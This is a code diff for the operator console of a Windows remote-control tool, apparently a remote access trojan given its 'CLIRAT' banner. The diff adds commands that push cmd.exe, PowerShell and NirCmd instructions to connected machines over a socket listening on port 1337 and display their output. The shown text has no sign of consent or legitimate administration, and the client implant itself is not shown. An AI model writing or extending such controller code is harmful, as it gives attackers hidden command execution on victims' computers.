@@ -1,4 +1,4 @@
-#include "pch.h"
+﻿#include "pch.h"
 #pragma warning( disable : 4996)
 #pragma comment (lib, "ws2_32.lib")
 using namespace std;
@@ -48,14 +48,16 @@ void detach();
 bool send_msg(string message, string header);
 void exit();
 void disp_connection(Connection c);
+void ShowCursor(bool show);
 void clear();
+void display_banner();
 int optVal;
 int optLen = sizeof(int);
 int clear_count = 0;
 int auto_clear_thrs = 3;
-void execute(string command);
-void cout_green(string prefix, string input);
-void cout_error(string prefix, string input);
+void execute_cmd(string command);
+void execute_ps(string command);
+void execute_nir(string command);
 bool cmp_unq(Connection c, string unq_name);
 bool is_socket_num(string input);
 bool is_unique(string input);
@@ -82,13 +84,17 @@ template<typename paramType>
 map<string, function<void(paramType)>> function_connected = {
 	{"detach", [](paramType x) {detach(); }},
 	{"tsend", [](paramType x) {send_message(x); }},
-	{"execute",[](paramType x) {execute(x); }},
+	{"cmd",[](paramType x) {execute_cmd(x); }},
+	{"ps", [](paramType x) {execute_ps(x); }},
+	{"nircmd", [](paramType x) {execute_nir(x); }}
 };
 
 int main()
 {
+	clear();
 	client_handler = thread(connection_handler, ref(global_set), 1337, ref(listening_socket));
 	client_handler.detach();
+	display_banner();
 	while (true) {
 		commandline();
 	}
@@ -229,6 +235,26 @@ bool check_error(int status) {
 	}
 }
 
+void display_banner() {
+	vector<string> banner = {
+	R"(        _/_/_/  _/        _/_/_/      _/_/_/      _/_/    _/_/_/_/_/   )",
+	R"(     _/        _/          _/        _/    _/  _/    _/      _/        )",
+	R"(    _/        _/          _/        _/_/_/    _/_/_/_/      _/         )",
+	R"(   _/        _/          _/        _/    _/  _/    _/      _/          )",
+	R"(    _/_/_/  _/_/_/_/  _/_/_/      _/    _/  _/    _/      _/           )"
+	};
+	SetCaretBlinkTime(100);
+	cout << endl;
+	for (auto i : banner) {
+		for (auto c : i) {
+			cout << c;
+			Sleep(3);
+		}
+		cout << endl;
+	}
+	cout << endl;
+}
+
 void settings(string command) {
 	/*
 	enter 13
@@ -264,11 +290,40 @@ COORD GetConsoleCursorPosition(HANDLE hConsoleOutput)
 	}
 }
 
-void execute(string command) {
-	send_msg(command, "CMDE");
+void ShowCursor(bool show) {
+	HANDLE hConsoleOutput;
+	CONSOLE_CURSOR_INFO structCursorInfo;
+	hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
+	GetConsoleCursorInfo(hConsoleOutput, &structCursorInfo);
+	structCursorInfo.bVisible = show;
+	SetConsoleCursorInfo(hConsoleOutput,
+		&structCursorInfo);
+}
+
+void execute_cmd(string command) { 
+	send_msg(command, "CMDO");
 	string type, data;
-	cout << "Command Output for \"" << command << "\"" << endl;
+	cout << "cmd.exe output for \"" << command << "\"" << endl;
 	while (type != "CMDE") {
+		recv_data(type, data);
+		if (!(data == "\n" || data == "\r")) {
+			cout << data;
+		}
+		Sleep(10);
+	}
+	cout << endl;
+	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
+	COORD c = GetConsoleCursorPosition(h);
+	c.Y -= 1;
+	SetConsoleCursorPosition(h, c); // this little hack remove the current directory from outputing after the commadn ouput
+}
+
+void execute_ps(string command)
+{
+	send_msg(command, "POSO");
+	string type, data;
+	cout << "powershell.exe output for \"" << command << "\"" << endl;
+	while (type != "POSE") {
 		recv_data(type, data);
 		if (!(data == "\n" || data == "\r")) {
 			cout << data;
@@ -279,10 +334,19 @@ void execute(string command) {
 	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
 	COORD c = GetConsoleCursorPosition(h);
 	c.Y -= 1;
-	SetConsoleCursorPosition(h, c); // this little hack remove the current directory from outputing after the commadn ouput
+	SetConsoleCursorPosition(h, c); // this little hack remove the current directory from outputing after the command ouput
 }
 
-
+void execute_nir(string command)
+{
+	send_msg(command, "NIRO");
+	cout << "Nircmd.dll return for \"" << command << "\" = ";
+	string data, type;
+	recv_data(type, data);
+	if (type == "NIRB") {
+		cout << "("<< data << ")" << endl;
+	}
+}
 
 void detach()
 {
